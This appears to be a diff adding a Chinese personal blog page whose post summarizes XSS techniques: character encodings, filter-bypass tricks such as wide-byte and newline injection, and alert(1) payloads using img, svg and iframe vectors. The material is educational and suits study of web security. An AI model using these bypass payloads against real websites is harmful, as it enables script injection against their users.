@@ -1,0 +1,418 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>XSS相关技术总结 | 天空下行走</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="专注安全、专注生活、专注人生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="XSS相关技术总结"/>
+  <meta property="og:site_name" content="天空下行走"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.ico" rel="shortcut icon" type="image/x-icon">
+
+  <link rel="alternate" href="/atom.xml" title="天空下行走" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">天空下行走</a></h1>
+  <h2><a href="/">Walk Around</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/about">About</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+    <li> <a href="/atom.xml">RSS</a> </li>
+    <li> <a title="把这个链接拖到你的Chrome收藏夹工具栏中" href='javascript:(function() {
+	function c() {
+		var e = document.createElement("link");
+		e.setAttribute("type", "text/css");
+		e.setAttribute("rel", "stylesheet");
+		e.setAttribute("href", f);
+		e.setAttribute("class", l);
+		document.body.appendChild(e)
+	}
+ 
+	function h() {
+		var e = document.getElementsByClassName(l);
+		for (var t = 0; t < e.length; t++) {
+			document.body.removeChild(e[t])
+		}
+	}
+ 
+	function p() {
+		var e = document.createElement("div");
+		e.setAttribute("class", a);
+		document.body.appendChild(e);
+		setTimeout(function() {
+			document.body.removeChild(e)
+		}, 100)
+	}
+ 
+	function d(e) {
+		return {
+			height : e.offsetHeight,
+			width : e.offsetWidth
+		}
+	}
+ 
+	function v(i) {
+		var s = d(i);
+		return s.height > e && s.height < n && s.width > t && s.width < r
+	}
+ 
+	function m(e) {
+		var t = e;
+		var n = 0;
+		while (!!t) {
+			n += t.offsetTop;
+			t = t.offsetParent
+		}
+		return n
+	}
+ 
+	function g() {
+		var e = document.documentElement;
+		if (!!window.innerWidth) {
+			return window.innerHeight
+		} else if (e && !isNaN(e.clientHeight)) {
+			return e.clientHeight
+		}
+		return 0
+	}
+ 
+	function y() {
+		if (window.pageYOffset) {
+			return window.pageYOffset
+		}
+		return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
+	}
+ 
+	function E(e) {
+		var t = m(e);
+		return t >= w && t <= b + w
+	}
+ 
+	function S() {
+		var e = document.createElement("audio");
+		e.setAttribute("class", l);
+		e.src = i;
+		e.loop = false;
+		e.addEventListener("canplay", function() {
+			setTimeout(function() {
+				x(k)
+			}, 500);
+			setTimeout(function() {
+				N();
+				p();
+				for (var e = 0; e < O.length; e++) {
+					T(O[e])
+				}
+			}, 15500)
+		}, true);
+		e.addEventListener("ended", function() {
+			N();
+			h()
+		}, true);
+		e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";
+		document.body.appendChild(e);
+		e.play()
+	}
+ 
+	function x(e) {
+		e.className += " " + s + " " + o
+	}
+ 
+	function T(e) {
+		e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)]
+	}
+ 
+	function N() {
+		var e = document.getElementsByClassName(s);
+		var t = new RegExp("\\b" + s + "\\b");
+		for (var n = 0; n < e.length; ) {
+			e[n].className = e[n].className.replace(t, "")
+		}
+	}
+ 
+	var e = 30;
+	var t = 30;
+	var n = 350;
+	var r = 350;
+	var i = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";
+	var s = "mw-harlem_shake_me";
+	var o = "im_first";
+	var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
+	var a = "mw-strobe_light";
+	var f = "//s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
+	var l = "mw_added_css";
+	var b = g();
+	var w = y();
+	var C = document.getElementsByTagName("*");
+	var k = null;
+	for (var L = 0; L < C.length; L++) {
+		var A = C[L];
+		if (v(A)) {
+			if (E(A)) {
+				k = A;
+				break
+			}
+		}
+	}
+	if (A === null) {
+		console.warn("Could not find a node of the right size. Please try a different page.");
+		return
+	}
+	c();
+	S();
+	var O = [];
+	for (var L = 0; L < C.length; L++) {
+		var A = C[L];
+		if (v(A)) {
+			O.push(A)
+		}
+	}
+	})()    '>High一下</a> </li>
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2014-09-22T09:58:57.000Z"><a href="/2014/09/22/XSS相关技术总结/">2014-09-22</a></time>
+      
+      
+  
+    <h1 class="title">XSS相关技术总结</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+      
+            <div id="toc" class="toc-article">
+                <strong class="toc-title">文章目录</strong>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用编码"><span class="toc-number">1.</span> <span class="toc-text">常用编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL编码"><span class="toc-number">1.1.</span> <span class="toc-text">URL编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML实体编码"><span class="toc-number">1.2.</span> <span class="toc-text">HTML实体编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符编码"><span class="toc-number">1.3.</span> <span class="toc-text">字符编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS编码"><span class="toc-number">1.4.</span> <span class="toc-text">JS编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS编码"><span class="toc-number">1.5.</span> <span class="toc-text">CSS编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复合编码"><span class="toc-number">1.6.</span> <span class="toc-text">复合编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过技巧"><span class="toc-number">2.</span> <span class="toc-text">绕过技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于iframe标签"><span class="toc-number">3.</span> <span class="toc-text">关于iframe标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol>
+            </div>
+            
+        <p>关于XSS自己也学习了不少了，本文主要把一些XSS构造利用方面的技术总结下吧，本文参考了很多，如有雷同。算我抄你的。<br><a id="more"></a></p>
+<h2 id="常用编码"><strong>常用编码</strong></h2><h3 id="URL编码"><strong>URL编码</strong></h3><p>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为<code>%2F</code>，“%”的URL编码为<code>%25</code></p>
+<h3 id="HTML实体编码"><strong>HTML实体编码</strong></h3><p>以&amp;开头，分号结尾的，例如“&lt;”的编码是<code>&amp;lt;</code>空格为<code>&amp;nbsp;</code></p>
+<h3 id="字符编码"><strong>字符编码</strong></h3><p>十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”。</p>
+<p>例如“&lt;”可以编码十进制字符编码：<code>&amp;#060;</code>,十六进制：<code>&amp;#x3c;</code>,unicode字符编码格式为：<code>&amp;#0060</code>;</p>
+<h3 id="JS编码"><strong>JS编码</strong></h3><p>js提供了四种字符编码的策略</p>
+<ul>
+<li>三个八进制数字，如果不够个数，前面补0，例如“e”编码为<code>\145</code></li>
+<li>两个十六进制数字，如果不够个数，前面补0，例如“e”编码为<code>\x65</code></li>
+<li>四个十六进制数字，如果不够个数，前面补0，例如“e”编码为<code>\u0065</code></li>
+<li>对于一些控制字符，使用特殊的C类型的转义风格（例如<code>\n</code>和<code>\r</code>）</li>
+</ul>
+<h3 id="CSS编码"><strong>CSS编码</strong></h3><p>用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”</p>
+<h3 id="复合编码"><strong>复合编码</strong></h3><p>所谓复合编码，也就是说输出的内容输出在多个环境中，例如<br><code>&lt;td onclick=”openUrl(add.do?userName=’&lt;%=value%&gt;’);”&gt;11&lt;/td&gt;</code><br>value的内容首先出现在一个URL中，这个URL在一段javascript中，而javascript代码又是html的一部分。所以解码的顺序就是HTML解码–&gt;js解码–&gt;url解码，那么正确的编码顺序就应该是url编码–&gt;js编码–&gt;html编码。</p>
+<h2 id="绕过技巧"><strong>绕过技巧</strong></h2><ul>
+<li>首先什么都没过滤的情况，那就直接插入<code>&lt;script&gt;alert(/XSS/)&lt;/script&gt;</code>,但是推荐使用img标签，即<code>&lt;img src=1 onerror=alert(1)&gt;</code>或者svg标签<code>&lt;svg/onload=alert(1)&gt;</code>这种方式，因为在Dom型XSS中，innerHTML里面不能以<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>方式来触发</li>
+<li>输出在一堆JS代码中，则要构造语句，闭合JS代码，使得JS代码能够正常执行，否则无法触发XSS。如果exp在页面中有两处以上回显，可以使用如下类型的构造思路:<code>&lt;/script&gt;&lt;script&gt;...exp...</code>,在页面中就会有形如<code>&lt;/script&gt;&lt;script&gt;...exp......&lt;/script&gt;&lt;script&gt;...exp...</code>的输出.</li>
+<li>宽字节：页面编码为gb2312，用%c0吃掉被过滤的引号即%5c，这里原理同宽字节注入。</li>
+<li>反斜线：利用反斜线过滤引号，但是还是要把剩下的闭合好。</li>
+<li>换行符：<code>%0a</code>主要用于exp出现在了代码注释中。注：在javascript中可以用<code>\</code>连接被换行的一个字符串。</li>
+</ul>
+<h2 id="关于iframe标签"><strong>关于iframe标签</strong></h2><ul>
+<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>src执行js：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>chrome下的srcdoc属性：<code>&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;script&gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+</ul>
+<h2 id="参考文章"><strong>参考文章</strong></h2><ul>
+<li><a href="http://www.freebuf.com/articles/web/43285.html" target="_blank" rel="external">XSS编码剖析</a></li>
+</ul>
+
+      
+    </div>
+    <footer>
+      
+        
+  
+  <div class="categories">
+    <a href="/categories/Web安全/">Web安全</a>
+  </div>
+ 
+        
+  
+  <div class="tags">
+    <a href="/tags/XSS/">XSS</a>
+  </div>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+<nav id="pagination" >
+  
+  <a href="/2014/09/28/linux入门笔记/" class="alignleft prev" >上一頁</a>
+  
+  
+  <a href="/2014/09/21/Android在ubuntu下真机调试/" class="alignright next" >下一頁</a>
+  
+  <div class="clearfix"></div>
+</nav>
+
+<section id="comment">
+<!-- 多说评论框 start -->
+  <div class="ds-thread" data-thread-key="_posts/XSS相关技术总结.md" data-title="XSS相关技术总结" data-url="http://ohroot.com/2014/09/22/XSS相关技术总结/"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"bigegg"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+<!-- 多说公共JS代码 end -->
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜尋">
+    <input type="hidden" name="q" value="site:ohroot.com">
+  </form>
+</div>
+
+  
+<script type="text/javascript" src="/js/tag.js"></script>
+<div class="widget tagcloud">
+  <h3 class="title">標籤雲</h3>
+  <div class="entry" id = "cloud3d">
+    <a href="/tags/Android/" style="font-size: 15px;">Android</a><a href="/tags/CentOS/" style="font-size: 12.5px;">CentOS</a><a href="/tags/Linux/" style="font-size: 20px;">Linux</a><a href="/tags/Mongodb/" style="font-size: 15px;">Mongodb</a><a href="/tags/Nginx/" style="font-size: 10px;">Nginx</a><a href="/tags/Web运维/" style="font-size: 10px;">Web运维</a><a href="/tags/XSS/" style="font-size: 12.5px;">XSS</a><a href="/tags/hexo/" style="font-size: 17.5px;">hexo</a><a href="/tags/javascript/" style="font-size: 12.5px;">javascript</a><a href="/tags/mysql/" style="font-size: 15px;">mysql</a><a href="/tags/phantomjs/" style="font-size: 10px;">phantomjs</a><a href="/tags/python/" style="font-size: 15px;">python</a><a href="/tags/sublime/" style="font-size: 10px;">sublime</a><a href="/tags/渗透测试/" style="font-size: 17.5px;">渗透测试</a>
+  </div>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">分類</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Android/">Android</a><small>3</small></li>
+  
+    <li><a href="/categories/Web安全/">Web安全</a><small>5</small></li>
+  
+    <li><a href="/categories/Web运维/">Web运维</a><small>1</small></li>
+  
+    <li><a href="/categories/hexo/">hexo</a><small>3</small></li>
+  
+    <li><a href="/categories/工具使用/">工具使用</a><small>1</small></li>
+  
+    <li><a href="/categories/操作系统/">操作系统</a><small>9</small></li>
+  
+    <li><a href="/categories/数据库/">数据库</a><small>5</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>1</small></li>
+  
+    <li><a href="/categories/编程/">编程</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2015/03/15/ubuntu14-04下修复flash版本问题/">ubuntu14.04下修复flash版本问题</a>
+      </li>
+    
+      <li>
+        <a href="/2015/03/12/从BSON文件到MySQL/">从BSON文件到MySQL</a>
+      </li>
+    
+      <li>
+        <a href="/2015/03/11/MySQL-Cluster搭建/">MySQL Cluster搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2015/03/11/Mongodb取消开机自启动/">Mongodb取消开机自启动</a>
+      </li>
+    
+      <li>
+        <a href="/2015/03/11/Mongodb安装笔记/">Mongodb安装笔记</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">友情链接</h3>
+<ul class="entry">
+<li><a href="http://www.sec-wiki.com/" title="SecWiki">SecWiki</a></li>
+<li><a href="http://www.jinglingshu.org/" title="jinglingshu">精灵鼠</a></li>
+</ul>
+</div>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2015 John Doe
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="/js/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F8f194a78c11f76027a96c6ec87298c62' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
